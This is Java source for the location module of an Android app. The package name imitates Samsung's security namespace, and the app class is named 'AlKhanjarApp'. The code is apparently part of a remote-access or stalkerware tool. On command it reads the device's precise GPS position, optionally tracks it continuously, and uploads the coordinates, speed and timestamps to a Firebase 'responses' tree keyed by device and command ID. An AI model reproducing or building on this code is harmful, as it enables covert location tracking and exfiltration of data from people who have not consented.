package com.samsung.android.security.v8.managers;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.samsung.android.security.v8.AlKhanjarApp;

import java.util.HashMap;
import java.util.Map;

/**
 * LocationManager - إدارة الموقع
 */
public class LocationManager {
    
    private static final String TAG = "LocationManager";
    private Context context;
    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private boolean isTracking = false;
    
    public LocationManager(Context context) {
        this.context = context;
        this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(context);
    }
    
    /**
     * الحصول على الموقع الحالي
     */
    public void getCurrentLocation(String commandId) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            sendResponse(commandId, "error", "Location permission denied");
            return;
        }
        
        fusedLocationClient.getLastLocation()
            .addOnSuccessListener(location -> {
                if (location != null) {
                    sendLocationData(commandId, location);
                } else {
                    requestNewLocation(commandId);
                }
            })
            .addOnFailureListener(e -> {
                Log.e(TAG, "Get location error: " + e.getMessage());
                sendResponse(commandId, "error", e.getMessage());
            });
    }
    
    /**
     * طلب موقع جديد
     */
    private void requestNewLocation(String commandId) {
        LocationRequest locationRequest = new LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, 1000)
            .setMinUpdateIntervalMillis(500)
            .setMaxUpdates(1)
            .build();
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            new LocationCallback() {
                @Override
                public void onLocationResult(LocationResult locationResult) {
                    Location location = locationResult.getLastLocation();
                    if (location != null) {
                        sendLocationData(commandId, location);
                    }
                }
            },
            Looper.getMainLooper()
        );
    }
    
    /**
     * بدء التتبع المستمر
     */
    public void startTracking(int intervalSeconds) {
        if (isTracking) return;
        
        LocationRequest locationRequest = new LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY, intervalSeconds * 1000L)
            .setMinUpdateIntervalMillis(intervalSeconds * 500L)
            .build();
        
        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    sendLocationData("tracking", location);
                }
            }
        };
        
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) 
            != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        
        fusedLocationClient.requestLocationUpdates(
            locationRequest,
            locationCallback,
            Looper.getMainLooper()
        );
        
        isTracking = true;
        Log.d(TAG, "Location tracking started");
    }
    
    /**
     * إيقاف التتبع
     */
    public void stopTracking() {
        if (!isTracking || locationCallback == null) return;
        
        fusedLocationClient.removeLocationUpdates(locationCallback);
        isTracking = false;
        Log.d(TAG, "Location tracking stopped");
    }
    
    /**
     * إرسال بيانات الموقع
     */
    private void sendLocationData(String commandId, Location location) {
        Map<String, Object> locationData = new HashMap<>();
        locationData.put("latitude", location.getLatitude());
        locationData.put("longitude", location.getLongitude());
        locationData.put("accuracy", location.getAccuracy());
        locationData.put("altitude", location.getAltitude());
        locationData.put("speed", location.getSpeed());
        locationData.put("bearing", location.getBearing());
        locationData.put("timestamp", location.getTime());
        
        sendResponse(commandId, "success", locationData);
    }
    
    /**
     * إرسال استجابة
     */
    private void sendResponse(String commandId, String status, Object data) {
        try {
            FirebaseDatabase database = FirebaseDatabase.getInstance();
            DatabaseReference responseRef = database.getReference("responses")
                .child(AlKhanjarApp.getDeviceId())
                .child(commandId);
            
            Map<String, Object> response = new HashMap<>();
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            responseRef.setValue(response);
            
        } catch (Exception e) {
            Log.e(TAG, "Send response error: " + e.getMessage());
        }
    }
}
